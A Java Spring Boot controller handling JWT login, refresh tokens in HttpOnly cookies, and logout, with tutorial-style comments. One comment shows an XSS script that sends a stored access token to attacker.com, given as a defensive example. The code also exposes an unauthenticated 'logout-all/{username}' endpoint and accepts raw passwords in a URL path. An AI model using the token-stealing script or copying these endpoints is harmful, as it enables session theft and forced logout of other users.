package com.rsbusinesstech.rsbusinesstech_backend.springSecurity.controller;

import com.rsbusinesstech.rsbusinesstech_backend.springSecurity.model.JwtRequest;
import com.rsbusinesstech.rsbusinesstech_backend.springSecurity.model.RefreshToken;
import com.rsbusinesstech.rsbusinesstech_backend.springSecurity.service.RefreshTokenService;
import com.rsbusinesstech.rsbusinesstech_backend.springSecurity.service.UserDetailsServiceImpl;
import com.rsbusinesstech.rsbusinesstech_backend.springSecurity.util.JWTUtil;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("jwt")
public class JwtController
{
    @Autowired
    UserDetailsServiceImpl userDetailsServiceImpl;

    @Autowired
    JWTUtil jwtUtil;

    @Autowired
    AuthenticationManager authenticationManager;

    @Autowired
    RefreshTokenService refreshTokenService;

    /*
        * This method converts a "rawPassword" into "encrypted" password using "BCryptPasswordEncoder".
        * BCrypt provides unique password each time.
        * BCrypt stores a unique "Salt" in each password.
        * This "salt" is used to match the "rawPassword" whether it is same as "encrypted" stored password or not.
     */
    @GetMapping("/public/getBcryptPassword/{rawPassword}")
    public ResponseEntity<String> getBcryptPassword(@PathVariable String rawPassword){
            BCryptPasswordEncoder bCryptPasswordEncoder = new BCryptPasswordEncoder();
            String bcryptPassword = bCryptPasswordEncoder.encode(rawPassword);
            return ResponseEntity.ok(bcryptPassword);
    }

    /*
         * This method accepts "username + password" from the client.
         * asks "spring-security" to authenticate it.
         * if authentication succeeds:
                         → generates ACCESS token (JWT).
                         → generates REFRESH token
                         → return both to the client.
         * if authentication fails → throws BadCredentialsException.
     */

    @PostMapping("/public/login")
    public ResponseEntity<Object> login(@RequestBody JwtRequest jwtRequest, HttpServletResponse response){
        //fetch raw "username+password" from JwtRequest.
        String username = jwtRequest.getUsername();
        String password = jwtRequest.getPassword();

        //prepare "UsernamePasswordAuthenticationToken" object, This object holds the raw "username+password", is a carrier only.
        UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(username, password);
        try{
            /*
               * This method internally:
                     1. calls userDetailsServiceImpl.loadUserByUsername(username);
                     2. fetches hashed password from JSON.
                     3. compares the passwords using BCryptPasswordEncoder.
                     4. if match → authentication succeeds.
                     5. if not → throws exception
            */
            //authenticate raw "username+password".
            authenticationManager.authenticate(usernamePasswordAuthenticationToken);
        }catch(Exception e){
            //handles authentication failure.
           e.printStackTrace();
           throw new BadCredentialsException("Incorrect username/password");
        }
        //load user details.
        UserDetails userDetails = userDetailsServiceImpl.loadUserByUsername(username);

        //generate ACCESS token(JWT).
        String accessToken = jwtUtil.generateToken(userDetails);

        //generates REFRESH token.
        RefreshToken refreshToken = refreshTokenService.generateRefreshToken(username);

        /*
                👉 XSS (Cross-Site Scripting):
              - Attacker injects JS → Browser executes it → Attacker steals data.
              - Example:
                          i.   A website allows users to post comments.
                          ii.  An attacker posts:
                               <script>
                                 fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"))
                               </script>
                          iii. The site didn't sanitize the input and run this script.
                          iv.  It reads the access token.
                          v.   Sends it to attacker.
                          vi.  Attacker can log in as you.
            - so, we will use "HttpOnly" Cookie to send the "refresh-token" because it has long life as compared to "access-token".
        */

        /*
           👉 HttpOnly Cookie:
              • it is designed specially to protect sensitive data (like "refresh-token") from XSS attack.
              • can't be accessed by JavaScript.
              • Normal cookie → document.cookie → JavaScript can read it but not in "HttpOnly" cookie.
                eg. Cookie cookie = new Cookie("token", "abc123");
                    cookie.setHttpOnly(true);  //it will prevent JavaScript to read it.
        */
        //set "refresh-token" inside HttpOnly Cookie.
        Cookie cookie = new Cookie("refreshToken", refreshToken.getToken());
        cookie.setHttpOnly(true);                            //to make this cooke HttpOnly cookie, prevents JavaScript to access this cookie(document.cookie or localStorage.getItem("accessToken")).
        cookie.setSecure(true);                              //sends this cookie only over https connections, not for Http.
        //cookie.setSecure(false); //for localhost:8080only.
        cookie.setPath("/");                                 //describing the endpoints, here the cookie is available for all endpoints i.e "/". we can mention a particular path also if want only for one endpoint.
        cookie.setMaxAge(60 * 30);                            //age of cookie i.e how long the cookie will be in browser, after this time the browser will delete this cookie.it should match expiry of "refresh-token".
        cookie.setAttribute("SameSite", "None");  //allows cookie to send over cross-site(frontend is netilify, backend is render → cross sites).Otherwise browser may block this cookie.
        //cookie.setAttribute("SameSite", "Lax");   //for localhost:8080 only.
        response.addCookie(cookie);                          //actually attaches the cookie with the response.

        //prepare response.
        Map<String,Object> responseMap = new HashMap<>();
        responseMap.put("accessToken",accessToken);

        //return token as response.
        return  ResponseEntity.ok(responseMap);
    }

    /* This method:
           • fetches "refreshToken" cookie, an HttpOnly cookie holding "refresh-token".
           • validates "refresh-token".
           • if success → generate a new Access token(JWT).
    */
    @PostMapping("/public/refresh-access-token")
    public ResponseEntity<Object> refreshAccessToken(@CookieValue("refreshToken") String refreshTokenValue){
        //validates the "refresh-token".
        RefreshToken refreshToken = refreshTokenService.validateToken(refreshTokenValue);

        //load user details.
        UserDetails userDetails = userDetailsServiceImpl.loadUserByUsername(refreshToken.getUsername());

        //generate ACCESS token(JWT).
        String accessToken = jwtUtil.generateToken(userDetails);

        //prepare response.
        Map<String,Object> response = new HashMap<>();
        response.put("accessToken",accessToken);

        //return token as response.
        return  ResponseEntity.ok(response);
    }

    /* This method:
           • removes a particular "refresh-token" from storage.
           • logout from a "single-device", for that particular session("refresh-token").
    */
    @DeleteMapping("/public/logout")
    public ResponseEntity<?> logout(@CookieValue("refreshToken") String refreshTokenValue, HttpServletResponse response){
        boolean isLogoutSuccessful = refreshTokenService.deleteRefreshTokenByToken(refreshTokenValue);
        if(isLogoutSuccessful){
            //remove "refresh-token" from HttpOnly Cookie.
            Cookie cookie = new Cookie("refreshToken", null);  //set value as null.
            cookie.setHttpOnly(true);
            cookie.setSecure(true);
            cookie.setPath("/");
            cookie.setMaxAge(0);                                           //set age as 0.
            cookie.setAttribute("SameSite", "None");
            response.addCookie(cookie);

          return ResponseEntity.ok("Logged out successfully.");
        }else{
            return ResponseEntity.badRequest().body("No refresh-token found for logout.");
        }
    }

    /* This method:
           • removes all "refresh-tokens" from storage for a particular user.
           • logout from "all-devices".
    */
    @DeleteMapping("/public/logout-all/{username}")
    public ResponseEntity<?> logoutAll(@PathVariable String username){
        boolean isLogoutSuccessful = refreshTokenService.deleteRefreshTokenByUsername(username);
        if(isLogoutSuccessful){
            return ResponseEntity.ok("Logged out successfully.");
        }else{
            return ResponseEntity.badRequest().body("No refresh-token found for logout.");
        }
    }
}
